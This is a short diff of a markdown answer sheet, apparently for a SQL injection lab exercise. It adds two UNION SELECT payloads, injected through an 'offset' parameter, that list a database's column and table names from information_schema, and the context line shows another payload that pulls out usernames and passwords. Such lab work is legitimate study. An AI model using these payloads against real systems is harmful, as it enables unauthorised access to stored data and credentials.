@@ -57,9 +57,14 @@ offset=10 UNION SELECT CONCAT("  USERNAME IS ", username, "  PASSWORD IS  ", pas
  Because it is not good
 
 ## Exercise 8
- 
+I've written 2 Injections:
+1. Prints all column names
 ```
-8
+offset=10 UNION SELECT column_name AS message, '' AS date_time FROM information_schema.columns 
+```
+2. Prints all tables name
+```
+offset=10 UNION SELECT table_name AS message, '' AS date_time FROM information_schema.tables
 ```
 
 ## Exercise 9
